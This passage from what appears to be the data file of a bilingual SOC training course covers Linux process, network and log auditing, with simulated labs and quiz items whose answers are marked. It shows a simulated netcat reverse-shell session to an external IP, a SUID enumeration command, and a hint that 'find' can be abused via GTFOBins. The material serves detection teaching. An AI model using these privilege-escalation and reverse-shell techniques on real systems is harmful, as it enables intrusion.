-rwsr-xr-x 1 root root  64424 Mar  9  2025 /usr/bin/passwd  (Legitimate)
-rwsr-xr-x 1 root root  44528 Mar  9  2025 /usr/bin/newgrp  (Legitimate)
-rwsr-xr-x 1 root root 124560 Nov  1 04:12 /usr/bin/find    <-- VULNERABLE SUID BINARY (GTFOBins Exploit Available!)</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('find / -perm -u=s -type f 2>/dev/null', 'standalone-term-body'); app.showToast('تم فحص ملفات SUID', 'info');">فحص ملفات الـ SUID في النظام</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "كيف تظهر علامة بت الـ SUID عند استعراض صلاحيات ملف تنفيذي بأمر `ls -la` في لينكس؟",
          questionEn: "How does the SUID bit appear in ls -la output in Linux?",
          optionsAr: [
            "تظهر علامة الحرف `s` بدلاً من `x` في خانة صلاحيات المالك (مثل: `-rwsr-xr-x`)",
            "يظهر اسم الملف بلون أخضر فقط",
            "يختفي اسم الملف من القائمة",
            "تظهر كلمة ROOT بجانب حجم الملف"
          ],
          optionsEn: [
            "The letter 's' replaces 'x' in owner permissions (e.g., -rwsr-xr-x)",
            "Green text color only",
            "Hidden filename",
            "Word ROOT appears"
          ],
          correctIndex: 0,
          explanationAr: "يدل الحرف الصغير `s` في خانة صلاحيات المستخدم المالك على تفعيل بت الـ SUID؛ مما يعني تشغيل الملف بصلاحيات مالكه (root) أياً كان المستخدم الذي قام بتشغيله."
        }
      },
      {
        id: "lesson-3-8",
        courseId: "course-3",
        number: "3.8",
        titleAr: "العمليات والشبكة والخدمات في Linux (ps, top, systemctl, netstat, ss, lsof, cronjobs)",
        titleEn: "Linux Process, Network & Service Auditing: ps, top, systemctl, ss, lsof & Cron",
        duration: "50 min",
        theoryAr: `
<h3>المراقبة الحية لخوادم لينكس: كيف ترصد العمليات الخفية والاتصالات الخارجية؟</h3>
<p class="lead">عندما يطلب منك الـ SOC فحص خادم لينكس مشبوه، يجب أن تتقن أدوات المراقبة الفورية لمعرفة من يتصل بالخادم، وما هي العمليات التي تستهلك المعالج (مثل برمجيات تعدين العملات المشفرة Crypto Miners)، وما هي الخدمات الدائمة.</p>

<h4>أهم أوامر التفتيش الميداني في لينكس لمحلل الـ SOC:</h4>
<ul>
  <li><code>ps aux:</code> عرض شجرة العمليات الكاملة مع اسم المستخدم والمسار وسطر الأوامر المستخدم لتشغيلها.</li>
  <li><code>top / htop:</code> مراقبة استهلاك المعالج والذاكرة في الوقت الفعلي (يكشف برامج التعدين الخبيثة فوراً).</li>
  <li><code>ss -tulpn:</code> البديل الحديث والسريع لأمر <code>netstat</code>؛ يعرض جميع المنافذ المفتوحة والخدمات التي تستمع عليها مع رقم الـ PID للعملية.</li>
  <li><code>lsof -i :port:</code> يكشف أي ملف أو عملية مرتبطة باتصال شبكي معين.</li>
  <li><code>systemctl status [service]:</code> التحقق من حالة خدمة معينة وتاريخ تشغيلها.</li>
  <li><code>crontab -l:</code> استعراض المهام المجدولة للمستخدم الحالي، مع فحص ملفات <code>/etc/cron.*</code> لكشف مهام البقاء الخبيثة.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص المنافذ والاتصالات في لينكس (Linux Network Triage)</span>
    <h4>كشف قذيفة عكسية (Reverse Shell) متصلة بسيرفر خارجي</h4>
  </div>
  <p>شاهد مخرجات أمر <code>ss -antp</code> لكشف الاتصال الخارجي المريب:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> linux-ss-inspector</div>
    <pre class="terminal-code">$ ss -antp
State      Recv-Q Send-Q Local Address:Port  Peer Address:Port   Process
LISTEN     0      128    0.0.0.0:80          0.0.0.0:*           users:(("nginx",pid=1120,fd=6))
ESTAB      0      0      10.0.0.45:49182     185.220.101.5:4444  users:(("nc",pid=3412,fd=3))
[CRITICAL ALERT] Netcat (nc) process established active outbound session to port 4444 (Reverse Shell)!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('ss -antp', 'standalone-term-body'); app.showToast('تم فحص اتصالات الشبكة النشطة', 'info');">فحص الاتصالات النشطة: ss -antp</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو الأمر الأسرع في بيئة لينكس الحديثة لعرض جميع المنافذ التي تستمع إليها الخدمات مع أرقام العمليات المسؤولة عنها (Listening Ports with PIDs)؟",
          questionEn: "What is the fastest command to view listening ports and PIDs in modern Linux?",
          optionsAr: [
            "`ss -tulpn`",
            "`ping localhost`",
            "`mkdir /temp`",
            "`reboot`"
          ],
          optionsEn: [
            "ss -tulpn",
            "ping localhost",
            "mkdir /temp",
            "reboot"
          ],
          correctIndex: 0,
          explanationAr: "أمر `ss -tulpn` يجمع وسائط عرض TCP (-t) و UDP (-u) والمنافذ المستمعة (-l) وحل الأرقام (-n) وعرض أسماء وأرقام العمليات المسؤولة (-p) وهو الخيار القياسي الأول لمحلل الـ SOC."
        }
      },
      {
        id: "lesson-3-9",
        courseId: "course-3",
        number: "3.9",
        titleAr: "إتقان أدوات تحليل النصوص والسجلات في Linux CLI (grep, egrep, awk, sed, cut, sort, uniq, head, tail, find)",
        titleEn: "Linux CLI Text Processing Mastery for SOC: grep, awk, sed, cut, sort, uniq & find",
        duration: "55 min",
        theoryAr: `
<h3>سلاح القوة المطلقة لمحلل السجلات: تصفية ملايين الأسطر في ثوانٍ معدودة</h3>
<p class="lead">عندما تتسلم ملف سجل بحجم 5 جيجابايت يحتوي على 10 ملايين سطر من خادم مخترق، لن تستطيع فتحه ببرنامج Notepad أو واجهة رسومية! أدوات معالجة النصوص في سطر أوامر لينكس تتيح لك استخراج عناوين المهاجمين وفرزها وإحصائها بسرعة خارقة.</p>

<h4>أهم أسلحة تصفية النصوص (The Text Processing Toolkit):</h4>
<ul>
  <li><strong><code>grep / egrep:</code></strong> البحث عن نصوص وأنماط منتظمة (Regex)؛ مثل استخراج كل الأسطر التي تحتوي على <code>Failed password</code> أو عناوين IP.</li>
  <li><strong><code>awk:</code></strong> لغة معالجة أعمدة قوية؛ تتيح طباعة عمود محدد بسهولة، مثل طباعة عمود عنوان الـ IP فقط: <code>awk '{print $1}'</code>.</li>
  <li><strong><code>cut:</code></strong> قص وتجزئة النصوص بناءً على فاصل محدد (Delimiter).</li>
  <li><strong><code>sort:</code></strong> ترتيب الأسطر أبجدياً أو رقمياً (<code>sort -n</code>).</li>
  <li><strong><code>uniq -c:</code></strong> إزالة التكرار مع حساب عدد مرات ظهور كل عنصر (Counting Frequency)؛ أداة ذهبية لمعرفة أكثر العناوين مهاجمة للموقع.</li>
  <li><strong><code>head / tail:</code></strong> قراءة أول 10 أسطر أو آخر 10 أسطر، مع وسيط <code>tail -f</code> للمراقبة الحية في الوقت الفعلي للوجات أثناء وقوع الهجوم.</li>
</ul>

<h4>السلسلة السحرية لأي محلل SOC (The SOC Magic Pipeline):</h4>
<pre><code class="language-bash"># استخراج أعلى 10 عناوين IP حاولت تسجيل الدخول بكلمات سر فاشلة:
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -n 10</code></pre>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي سحر تصفية السجلات (Log Pipeline Simulator)</span>
    <h4>تنفيذ خط أنابيب Bash لاستخراج أكثر 3 عناوين IP مهاجمة</h4>
  </div>
  <p>شاهد نتائج تحليل 50,000 محاولة دخول فاشلة بواسطة سطر الأوامر:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> bash-pipeline-runner</div>
    <pre class="terminal-code">$ grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 3
  14,892 198.51.100.44  <-- ATTACKER 1 (Automated SSH Brute Force)
   9,410 203.0.113.88   <-- ATTACKER 2
   3,120 45.33.32.156   <-- ATTACKER 3</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('grep \"Failed password\" /var/log/auth.log | head -n 5', 'standalone-term-body'); app.showToast('تم فحص محاولات الدخول الفاشلة', 'info');">فحص أول 5 محاولات فاشلة: grep Failed password</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في سطر أوامر لينكس، ما هو الغرض من استخدام أمر `uniq -c` بعد أمر `sort` أثناء تحليل سجلات الهجمات؟",
          questionEn: "Why pipe to sort | uniq -c during log analysis?",
          optionsAr: [
            "لدمج الأسطر المتطابقة وحساب عدد مرات تكرار كل قيمة (مثل عدد محاولات الهجوم لكل عنوان IP)",
            "لحذف ملف السجل من القرص الصلب فوراً",
            "لإعادة تشغيل خادم الويب تلقائياً",
            "لتشفير الملف بكلمة سر"
          ],
          optionsEn: [
            "To aggregate identical lines and count occurrences (frequency of each IP)",
            "To delete log file",
            "To restart web server",
            "To password-protect file"
          ],
          correctIndex: 0,
          explanationAr: "أمر `uniq -c` يتطلب بيانات مرتبة مسبقاً عبر `sort`، ويقوم بحساب عدد مرات ظهور كل عنصر مكرر بجانبه مباشرة، مما يعطي المحلل إحصائية فورية بأكثر الجهات المهاجمة نشاطاً."
        }
      },
      {
        id: "lesson-3-10",
        courseId: "course-3",
        number: "3.10",
        titleAr: "التحقيق في سجلات لينكس الجنائية (/var/log/auth.log, syslog, secure, auditd) وكشف محاولات الدخول العنيف واختراق الـ SSH",
        titleEn: "Linux Log Forensics: auth.log, syslog, auditd & Detecting SSH Brute-Force Attacks",
        duration: "55 min",
        theoryAr: `
<h3>التحقيق الجنائي في لينكس: تشريح سجلات المصادقة وكشف الاختراقات الناجحة</h3>
<p class="lead">عندما يتعرض سيرفر لينكس لهجوم، يترك المهاجم بصمات رقمية واضحة في ملفات السجلات. معرفة بنية سجلات الدخول تمكن محلل الـ SOC من تمييز محاولات التخمين الفاشلة من تسجيل الدخول الناجح الذي تبعه اختراق فعلي.</p>

<h4>أهم ملفات السجلات الجنائية في لينكس:</h4>
<ul>
  <li><strong><code>/var/log/auth.log</code> (Debian/Ubuntu) أو <code>/var/log/secure</code> (RHEL/CentOS):</strong> يسجل كل عمليات تسجيل الدخول، استخدام أوامر <code>sudo</code>، ومحاولات الدخول عبر بروتوكول SSH.</li>
  <li><strong><code>/var/log/syslog</code> أو <code>/var/log/messages:</code></strong> السجل العام للنظام وأحداث الخدمات المختلفة.</li>
  <li><strong><code>/var/log/audit/audit.log:</code></strong> السجل الأكثر تفصيلاً الصادر عن خدمة <code>auditd</code>؛ يسجل نداءات النظام والوصول لملفات حساسة بدقة عالية.</li>
</ul>

<h4>تشريح سطر سجل SSH لمحلل الـ SOC:</h4>
<pre><code class="language-text"># محاولة دخول فاشلة (Failed Logon):
Nov 7 03:14:22 web-srv sshd[24190]: Failed password for invalid user admin from 198.51.100.44 port 48212 ssh2

# محاولة دخول ناجحة (Accepted Logon):
Nov 7 03:15:01 web-srv sshd[24205]: Accepted password for root from 198.51.100.44 port 48218 ssh2</code></pre>
<p><strong>الاستنتاج الأمني الحرج:</strong> حدوث آلاف السجلات التي تحتوي على <code>Failed password</code> لنفس الـ IP تتبعها مباشرة رسالة <code>Accepted password</code> لنفس الـ IP، يدل بشكل قاطع على <strong>هجوم تخمين كلمات مرور ناجح (Successful SSH Brute Force)</strong> وتطلب احتواء السيرفر وتغيير كلمة السر فوراً!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي التحقيق في هجوم SSH (SSH Intrusion Investigation)</span>
    <h4>رصد لحظة نجاح المهاجم في كسر كلمة سر خادم لينكس</h4>
  </div>
  <p>تفحص السجلات التالية ولاحظ نقطة التحول الكارثية:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> ssh-audit-viewer</div>
    <pre class="terminal-code">04:10:01 web01 sshd[9101]: Failed password for root from 185.190.40.11 port 33102 ssh2
04:10:03 web01 sshd[9104]: Failed password for root from 185.190.40.11 port 33104 ssh2
04:10:05 web01 sshd[9108]: Failed password for root from 185.190.40.11 port 33106 ssh2
04:10:08 web01 sshd[9112]: Accepted password for root from 185.190.40.11 port 33110 ssh2  <-- BREACH SUCCESSFUL!
04:10:09 web01 sshd[9112]: pam_unix(sshd:session): session opened for user root by (uid=0)
[CRITICAL ALERT] 400+ Failed logins followed by SUCCESSFUL ROOT LOGIN from same external IP!</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('grep \"Accepted password\" /var/log/auth.log', 'standalone-term-body'); app.showToast('تم فحص عمليات الدخول الناجحة Accepted password', 'info');">فحص عمليات الدخول الناجحة Accepted password</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في سجلات الـ SSH، ماذا يستنتج محلل الـ SOC عند ملاحظة مئات أسطر `Failed password` من عنوان IP خارجي واحد، تنتهي فجأة بسطر `Accepted password` لنفس العنوان؟",
          questionEn: "What does hundreds of Failed passwords followed by Accepted password indicate?",
          optionsAr: [
            "هجوم تخمين كلمات مرور ناجح (Successful Brute-Force Breach)، والمهاجم تمكن من كسر الحساب واختراق السيرفر بالفعل",
            "المستخدم نسي كلمة مروره فقط وتذكرها فجأة بشكل طبيعي",
            "انقطاع في كابل الإنترنت الخاص بالسيرفر",
            "النظام قام بتحديث المتصفح تلقائياً"
          ],
          optionsEn: [
            "Successful brute-force breach: attacker cracked credentials and breached the system",
            "User merely forgot password",
            "Cable disconnection",
            "Browser updated"
          ],
          correctIndex: 0,
          explanationAr: "هذا النمط الكلاسيكي يمثل اختراقاً حقيقياً (True Positive Breach)؛ حيث استمرت محاولات التخمين الآلي حتى تم إيجاد كلمة السر الصحيحة وتمكن المهاجم من فتح جلسة رسمية على السيرفر."
        }
      }
    ]
  }
];
